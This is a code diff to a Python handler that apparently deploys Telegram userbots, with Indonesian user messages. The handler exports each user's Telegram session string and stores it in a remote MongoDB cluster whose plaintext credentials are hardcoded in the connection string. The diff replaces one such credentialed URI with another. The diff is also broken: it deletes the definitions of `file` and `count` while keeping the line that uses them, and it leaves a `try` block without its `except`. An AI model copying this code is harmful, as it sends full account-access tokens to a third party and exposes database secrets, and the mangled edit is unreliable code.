@@ -64,21 +64,12 @@ async def recv_tg_tfa_message(_, message: Message):
         )
         del AKTIFPERINTAH[message.chat.id]
     else:
-        client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
+        client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
         load_dotenv()
-        
-        file = os.path.join(os.path.dirname(__file__), 'count.txt')
-        with open(file, "r") as f:
-            count = int(f.read().strip())
-        count += 1
-        with open(file, "w") as f:
-            f.write(str(count))
-        
-        filename = ".env"
-        with open(filename, "a") as file:
+
             file.write(f"\nSESSION{count}={str(await loical_ci.export_session_string())}")
         await message.reply_text("`Berhasil Melakukan Deploy.`")
         session_data = {
@@ -95,10 +86,7 @@ async def recv_tg_tfa_message(_, message: Message):
         try:
             await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")
             LOGGER(__name__).info("BOT SERVER RESTARTED !!")
-        except BaseException as err:
-            LOGGER(__name__).info(f"{err}")
-            return
-        
+
         if HAPP is not None:
             HAPP.restart()
         else:
